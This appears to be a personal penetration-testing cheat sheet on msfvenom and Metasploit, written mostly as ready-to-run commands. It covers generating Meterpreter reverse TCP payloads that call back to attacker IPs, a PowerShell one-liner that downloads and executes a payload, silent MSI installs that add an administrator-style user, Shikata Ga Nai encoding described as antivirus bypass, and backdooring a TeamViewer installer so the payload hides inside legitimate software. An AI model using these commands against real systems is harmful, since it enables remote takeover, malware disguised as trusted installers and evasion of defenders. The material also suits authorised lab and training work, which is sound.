---
tags:
  - Exploitation
  - RemoteShells
  - Tooling
---
MSFVenom is the payload creating cousin of Metasploit. With it, you can create a wide variety of shellcodes, reverse TCP connectors, and much more. [MSFvenom - Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfvenom/)

Reverse connections are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a `security trust zone`. However, of course, this trust policy is not blindly followed by the security devices and personnel of a network, so the attacker must tread carefully even with this step.

## Usage

##### List Payloads 

```shell-session
msfvenom -l payloads
```

##### Options 

| Option                            | Description                                            |
| --------------------------------- | ------------------------------------------------------ |
| -p \<PAYLOAD\>                    | Generate a payload from the list in [[#List Payloads]] |
| LHOST=10.10.14.113 LPORT=443 <br> | Addresses to connect back to                           |
| -f elf                            | Format to generate the payload in                      |
| -o \<FILE\>                       | Output file                                            |
##  Setting Up Meterpreter Multi/Handler

```shell-session
msfconsole
```

```shell-session
use multi/handler
```

Set options.

```shell-session
run
```
## Commands

```
sudo msfvenom -p windows/adduser USER=quas4r PASS=quas4r@123 -f msi -o exploit.msi
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=445 -f psh -o www/met-445.ps1

iex(new-object net.webclient).downloadstring('http://10.10.14.5/met-445.ps1')
```

```
sudo msfvenom -p windows/adduser USER=quas4r PASS=quas4r@123 -f msi -o exploit.msi

msiexec /quiet /qn /i C:\Users\phoebe\exploit.msi
```


## Payload Encoders 

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. If we want to look at the functioning of the `shikata_ga_nai` encoder, we can look at an excellent post [here](https://hatching.io/blog/metasploit-payloads2/).

```shell-session
-e x86/shikata_ga_nai -i 10
```

Increasing the number following `-i` will increase the number of iterations of the encoder.

Encoders are also needed to remove hexadecimal opcodes known as `bad characters` from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

#### Anti-Virus Bypass 

```
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp
```

If the program gets closed quickly you can use` msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate`  in MSF console


## Embed into Executables 

We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances. 

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the `-k` flag as it appears above. However, even with the `-k` flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.